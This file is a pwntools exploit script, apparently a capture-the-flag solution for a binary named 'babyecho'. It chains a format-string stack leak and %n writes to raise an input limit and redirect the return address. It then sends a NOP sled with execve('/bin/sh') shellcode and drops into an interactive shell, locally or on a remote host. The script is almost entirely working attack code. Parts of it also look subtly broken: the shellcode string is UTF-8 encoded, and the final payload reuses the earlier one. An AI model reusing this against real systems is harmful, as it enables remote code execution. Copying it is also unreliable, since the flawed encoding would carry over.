#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./babyecho"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *0x8048ff7
        b *0x804902c
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# leak stack address
payload = "%{}$p".format(5).encode()
p.recvuntil("bytes")
p.sendline(payload)
p.recvline()
leak = eval(p.recv(10))
log.info("leak: 0x{:08x}".format(leak))
input_size_addr = leak - 0xc
log.info("input_size_addr: 0x{:08x}".format(input_size_addr))

# overwrite input size
payload = p32(input_size_addr)
payload += "%{}c%{}$n".format(99, 7).encode()
p.recvuntil("bytes")
p.sendline(payload)

cmp_addr = leak - 0x4
log.info("cmp address: 0x{:08x}".format(cmp_addr))
ret_addr = leak + 0x410
log.info("return address: 0x{:08x}".format(ret_addr))
buf_addr = leak
log.info("buffer start address: 0x{:08x}".format(buf_addr))

# send shellcode & execute
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload += p32(cmp_addr)
payload += p32(ret_addr)
payload += "%{}c%{}$n".format(51966, 10).encode()# 51966 = 0xcafe
shellcode_addr = buf_addr + len(payload) + 20
payload += "%{}c%{}$n".format(shellcode_addr, 11).encode()
payload += b"\x90" * 40
payload += "{}".format(shellcode).encode()

p.recvuntil("bytes")
p.sendline(payload)

p.interactive()
